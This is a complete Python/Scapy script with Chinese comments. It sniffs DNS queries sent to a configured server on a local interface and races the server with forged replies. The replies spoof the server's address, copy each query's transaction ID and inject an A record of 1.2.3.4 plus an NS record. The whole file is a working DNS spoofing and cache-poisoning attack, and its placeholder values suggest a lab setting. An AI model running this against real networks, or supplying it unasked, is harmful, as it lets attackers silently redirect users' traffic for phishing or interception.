from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
import time

# 配置DNS服务器的IP和端口
IFACE_LAN = "eth0"
DNS_SERVER_IP = "10.10.8.3"
PORT_OF_SERVER = "53"

# BPF过滤器
BPF_FILTER = "udp port " + PORT_OF_SERVER + " and ip dst " + DNS_SERVER_IP

def dns_response(pkt):
    try:
        if DNS in pkt and pkt[DNS].qr == 0:  # 只处理查询请求
            print("%s : fm %s:%d : %s A ?" % (
                time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), pkt[IP].src, pkt[UDP].sport,
                pkt[DNS].qd.qname.decode("utf-8")))

            print(pkt)

            # 构建伪造的DNS响应
            spf_resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(sport=int(PORT_OF_SERVER), dport=pkt[UDP].sport)
            spf_resp /= DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                            ancount=1, an=DNSRR(rrname=pkt[DNS].qd.qname, type=1, ttl=10, rdata="1.2.3.4"),
                            nscount=1, ns=DNSRR(rrname="example.com", type=2, ttl=60, rdata="ns.example.com"))

            send(spf_resp, iface=IFACE_LAN)

            print("%s : to %s:%d : %s A %s" % (
                time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), pkt[IP].src, pkt[UDP].sport,
                pkt[DNS].qd.qname.decode("utf-8"), "1.2.3.4"))

    except Exception as error:
        print("Error: ", error)

print("Start DNS Authority ...")
sniff(filter=BPF_FILTER, prn=dns_response, iface=IFACE_LAN)